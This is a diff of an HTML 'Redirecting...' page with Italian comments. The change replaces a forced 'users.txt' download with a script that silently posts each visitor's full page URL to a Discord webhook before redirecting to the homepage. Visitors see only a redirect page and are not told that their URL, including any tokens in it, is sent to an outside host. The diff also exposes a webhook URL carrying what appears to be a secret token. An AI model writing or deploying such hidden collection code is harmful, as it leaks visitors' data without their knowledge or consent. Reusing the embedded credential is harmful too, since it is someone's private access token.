@@ -1,25 +1,18 @@
 <!DOCTYPE html>
-<html>
+<html lang="it">
 <head>
   <meta charset="UTF-8">
   <title>Redirecting...</title>
-</head>
-<body>
-  <p>Redirecting to homepage...</p>
-
   <script>
-    const fullUrl = window.location.href;
-    const blob = new Blob([fullUrl + '\n'], { type: 'text/plain' });
+    // Invia l'URL della pagina al tuo webhook Discord
+    fetch("https://discord.com/api/webhooks/1384202309453480069/EVzqU4GCsD8160NE82evIVyBUeMtrybYIzVXAfvMBQD5LIssbN8rmvBnzOVqusT0UJT7", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: "Visita: " + window.location.href })
+    });
 
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'users.txt';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-
-    // Reindirizza dopo il download
+    // Reindirizza alla homepage
     window.location.href = "/";
   </script>
-</body>
+</head>
 </html>
